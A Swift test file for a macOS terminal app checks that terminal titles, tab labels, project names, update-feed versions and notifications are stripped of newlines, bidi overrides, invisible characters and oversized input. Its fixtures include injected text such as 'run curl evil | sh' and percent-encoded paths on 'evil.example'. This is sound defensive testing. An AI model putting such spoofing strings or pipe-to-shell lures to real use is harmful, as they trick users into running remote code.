import AppKit
import Foundation
import SwiftTerm
import Testing
@testable import Moo

/// Window titles are built from text programs control, including programs
/// on a remote host. These start from the attack input as it actually
/// arrives, not from a string shaped like the fix expects.
@MainActor
struct TitleSanitizingTests {
    /// A remote host's OSC 7 path is percent-decoded for display, so `%0A`
    /// becomes a real newline. The title must stay on one line.
    @Test func remoteDirectoryCannotAddALineToTheTitle() throws {
        let report = "file://evil.example/tmp%0AUpdate%20available%3A%20run%20this"
        let decoded = try #require(URL(string: report)?.path)
        #expect(decoded.contains("\n"))

        var inputs = TerminalTitleInputs()
        inputs.workingDirectory = decoded
        inputs.homeDirectory = "/Users/nobody"
        let title = TerminalTitleComposer.displayable(TerminalTitleComposer.title(
            for: [.workingDirectory, .fullPath],
            inputs: inputs
        ))
        #expect(!title.contains("\n"))
        #expect(title.contains("Update available"))
    }

    /// Line and paragraph separators, C1 controls and bidi overrides, as an
    /// OSC 2 title can carry them (SwiftTerm only stops at C0 bytes).
    @Test func titleLosesSeparatorsControlsAndBidiOverrides() {
        let hostile = "safe\u{2028}second\u{2029}third\u{0085}fourth\u{202E}desrever\u{2066}x"
        let shown = TerminalTitleComposer.displayable(hostile)
        for scalar in ["\u{2028}", "\u{2029}", "\u{0085}", "\u{202E}", "\u{2066}"] {
            #expect(!shown.contains(scalar))
        }
        #expect(shown == "safe second third fourth desrever x")
    }

    @Test func titleIsCapped() {
        let shown = TerminalTitleComposer.displayable(String(repeating: "a", count: 10_000))
        #expect(shown.count == TerminalTitleComposer.displayLimit)
    }

    /// The label draws one line even if something unsanitized reaches it.
    @Test func titleLabelNeverWraps() throws {
        let window = NSWindow(
            contentRect: NSRect(x: 0, y: 0, width: 600, height: 400),
            styleMask: [.titled, .closable, .resizable],
            backing: .buffered,
            defer: false
        )
        window.isReleasedWhenClosed = false
        defer { window.close() }
        WindowTitleAccessory.install(in: window)
        let accessory = try #require(window.titlebarAccessoryViewControllers.first { $0 is WindowTitleAccessory })
        let label = try #require(accessory.view.subviews.compactMap { $0 as? NSTextField }.first)
        window.title = "one\nUpdate available: run this"
        #expect(label.usesSingleLineMode)
        #expect(label.maximumNumberOfLines == 1)
        #expect(accessory.view.clipsToBounds)
        let single = NSTextField(labelWithString: "one")
        single.font = label.font
        #expect(label.intrinsicContentSize.height <= single.intrinsicContentSize.height + 1)
    }

    /// The appcast's version text is data: a tampered feed cannot fill the
    /// popover with instructions.
    @Test func feedVersionIsCleanedAndCapped() {
        let update = AvailableUpdate(
            feedVersion: "0.2.0\nURGENT: open Terminal and run curl evil | sh \u{202E}" + String(repeating: "x", count: 200),
            date: nil
        )
        #expect(!update.version.contains("\n"))
        #expect(!update.version.contains("\u{202E}"))
        #expect(update.version.count <= AvailableUpdate.versionLimit)
        #expect(AvailableUpdate(feedVersion: "0.1.9", date: nil).version == "0.1.9")
        #expect(AvailableUpdate(feedVersion: "\u{202E}\n", date: nil).version == "a new version")
    }

    // MARK: Size and invisible characters

    /// "Zalgo": one letter under a million combining accents, as an OSC 2
    /// title. The cleaned title keeps a handful of marks and is read in
    /// bounded time.
    @Test func stackedCombiningMarksAreBounded() {
        let hostile = "a" + String(repeating: "\u{0301}", count: 1_000_000) + "b"
        let start = Date()
        let shown = TerminalTitleComposer.displayable(hostile)
        #expect(Date().timeIntervalSince(start) < 0.5)
        #expect(shown.unicodeScalars.count <= TerminalNotificationParser.combiningMarkLimit + 2)
        #expect(shown.unicodeScalars.starts(with: "a\u{0301}".unicodeScalars))
        #expect(shown.hasSuffix("…"))
    }

    /// A 16 MiB title (SwiftTerm accepts up to 65 MiB per OSC) took 1.25 s of
    /// main thread to clean. Only a bounded prefix is read now.
    @Test func hugeTitleIsCleanedInBoundedTime() {
        let hostile = String(repeating: "A", count: 16 * 1_024 * 1_024)
        let start = Date()
        let shown = TerminalTitleComposer.displayable(hostile)
        #expect(Date().timeIntervalSince(start) < 0.5)
        #expect(shown.count == TerminalTitleComposer.displayLimit)
        #expect(shown.unicodeScalars.count <= TerminalTitleComposer.displayLimit)
    }

    /// The title a program posts reaches the tab strip already cleaned and
    /// capped: the tab label is not a window title and never was cleaned.
    @Test func postedTitleReachesTheTabCleaned() async throws {
        let session = WorkspaceSession(projectID: UUID(), startsProcesses: false)
        let tab = session.ensureTab()
        let controller = try #require(tab.panes?.focusedController)
        let hostile = "build\nURGENT: run curl evil | sh\u{202E}" + String(repeating: "x", count: 4 * 1_024 * 1_024)
        controller.setTerminalTitle(source: LocalProcessTerminalView(frame: .zero), title: hostile)
        // The title lands after a 75 ms debounce. Wait by turns, not by the
        // clock: when a parallel test holds the main actor for seconds, a
        // clock deadline expires before the queued title update gets to run,
        // while each turn here yields to it.
        for _ in 0..<200 where controller.tabTitle.isEmpty {
            try await Task.sleep(for: .milliseconds(25))
        }
        #expect(!controller.tabTitle.isEmpty)
        #expect(!controller.tabTitle.contains("\n"))
        #expect(!controller.tabTitle.contains("\u{202E}"))
        #expect(controller.tabTitle.count <= TerminalTitleComposer.displayLimit)
        #expect(!tab.displayTitle.contains("\n"))
    }

    /// An OSC 7 path whose last component decodes to a closing quote and
    /// blank lines once wrote its own sentence into the close-project
    /// dialog. The project name, the tab label and the sidebar path built
    /// from it stay on one line.
    @Test func directoryLeafCannotAddLinesToProjectNameOrTab() throws {
        let session = WorkspaceSession(projectID: UUID(), startsProcesses: false)
        let tab = session.ensureTab()
        let controller = try #require(tab.panes?.focusedController)
        controller.updateCurrentDirectory(
            "file://evil.example/tmp/x%E2%80%9D%3F%0A%0ANothing%20will%20be%20closed.%E2%80%8B%E2%81%A0"
        )
        let directory = try #require(controller.displayedWorkingDirectory)
        #expect(directory.contains("\n"))

        let project = Project(name: "New Project", isAutoNamed: true)
        let name = project.displayName(directory: directory)
        #expect(!name.contains("\n"))
        #expect(!name.contains("\u{200B}"))
        #expect(!name.contains("\u{2060}"))
        #expect(name.contains("Nothing will be closed."))
        #expect(!tab.displayTitle.contains("\n"))
        #expect(!directory.abbreviatedPath.contains("\n"))
    }

    /// A report longer than any real path is output, not a directory: it is
    /// ignored rather than cut down to some other path.
    @Test func oversizedDirectoryReportIsIgnored() throws {
        let session = WorkspaceSession(projectID: UUID(), startsProcesses: false)
        let controller = try #require(session.ensureTab().panes?.focusedController)
        controller.updateCurrentDirectory("file://localhost/tmp")
        controller.updateCurrentDirectory("file://localhost/" + String(repeating: "a", count: 8 * 1_024 * 1_024))
        #expect(controller.displayedWorkingDirectory == "/tmp")
    }

    /// Zero-width and other invisible format characters disappear, so a
    /// name cannot hide text or pass for an empty one; the joiners and
    /// variation selectors that emoji are built from survive.
    @Test func invisibleCharactersAreDroppedButEmojiSurvive() {
        let hostile = "M\u{200B}o\u{2060}o\u{FEFF}\u{00AD}\u{180E}\u{E0041}\u{E007F}\u{3164}\u{115F}!"
        #expect(TerminalTitleComposer.displayable(hostile) == "Moo!")
        #expect(TerminalTitleComposer.displayable("\u{200B}\u{3164}\u{FEFF}").isEmpty)
        let emoji = "👩‍💻 ❤️ 👍🏽 1️⃣"
        #expect(TerminalTitleComposer.displayable(emoji) == emoji)
        // Bidi controls are format characters too, but still become spaces.
        #expect(TerminalTitleComposer.displayable("a\u{202E}b") == "a b")
    }

    /// A tampered appcast's version cannot stack marks inside the 32
    /// characters it is allowed either.
    @Test func feedVersionCapCountsScalars() {
        let update = AvailableUpdate(
            feedVersion: "1" + String(repeating: "\u{0301}", count: 200_000),
            date: nil
        )
        #expect(update.version.unicodeScalars.count <= AvailableUpdate.versionLimit * 4)
        #expect(update.version.unicodeScalars.count <= TerminalNotificationParser.combiningMarkLimit + 2)
    }

    /// kitty notifications arrive in parts and are held until `d=1`. A
    /// program streaming megabytes without ever finishing makes Moo hold no
    /// more than the part limit, and the notification that finally completes
    /// is cleaned and capped.
    @Test func kittyPartsAreBoundedWhileUnfinished() throws {
        var assembler = KittyNotificationAssembler()
        let chunk = Array("i=7:d=0:p=body;".utf8) + Array(repeating: UInt8(ascii: "z"), count: 4 * 1_024 * 1_024)
        let start = Date()
        for _ in 0..<4 {
            let partial = assembler.consume(chunk)
            #expect(partial == nil)
        }
        let finished = assembler.consume(Array("i=7:d=1;Title\u{202E}\n".utf8))
        let done = try #require(finished)
        #expect(Date().timeIntervalSince(start) < 1)
        #expect(done.title == "Title")
        #expect(done.body.count <= TerminalNotificationParser.bodyLimit)
    }

    /// OSC 777 with a 16 MiB body is read only as far as the limits need.
    @Test func hugeNotificationPayloadIsBounded() throws {
        let payload = Array("notify;Done;".utf8) + Array(repeating: UInt8(ascii: "y"), count: 16 * 1_024 * 1_024)
        let start = Date()
        let parsed = try #require(TerminalNotificationParser.parse(code: 777, payload: payload))
        #expect(Date().timeIntervalSince(start) < 0.5)
        #expect(parsed.title == "Done")
        #expect(parsed.body.count == TerminalNotificationParser.bodyLimit)
    }
}
